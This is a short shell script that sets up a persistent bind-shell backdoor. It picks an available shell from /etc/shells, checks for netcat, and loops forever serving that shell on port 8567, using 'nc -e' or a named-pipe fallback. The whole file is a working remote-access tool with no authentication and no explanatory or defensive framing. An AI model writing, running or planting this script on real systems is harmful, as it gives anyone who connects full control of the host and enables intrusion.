PORT=8567
FIFO_PATH=/tmp/aware_past

# Find Valid Shells
SHELL_LIST=`cat /etc/shells 2> /dev/null`
if [ `echo $SHELL_LIST | wc -l` -eq 0 ]; then
    exit 1;
elif [ `(echo $SHELL_LIST | grep bash | wc -l) 2> /dev/null` -ne 0 ]; then
    SHELL=`which bash`
elif [ `(echo $SHELL_LIST | grep tsh | wc -l) 2> /dev/null` -ne 0 ]; then
    SHELL=`which tsh`
elif [ `(echo $SHELL_LIST | grep zsh | wc -l) 2> /dev/null` -ne 0 ]; then
    SHELL=`which zsh`
elif [ `(echo $SHELL_LIST | grep csh | wc -l) 2> /dev/null` -ne 0 ]; then
    SHELL=`which csh`
elif [ `(echo $SHELL_LIST | grep sh | wc -l) 2> /dev/null` -ne 0 ]; then
    SHELL=`which sh`
else
    exit 1;
fi

# whether nc exists or not
if [ `which nc | wc -l` -eq 0 ]; then
    exit 1;
fi
# find valid shells

while true
do
    nc -lvp $PORT -e $SHELL 2> /dev/null
    if [ $? -ne 0 ]; then 
        (rm -f ${FIFO_PATH}; mkfifo ${FIFO_PATH}) 2> /dev/null
        cat ${FIFO_PATH} | $SHELL -i 2>&1 | nc -l -p $PORT > ${FIFO_PATH}
    fi
done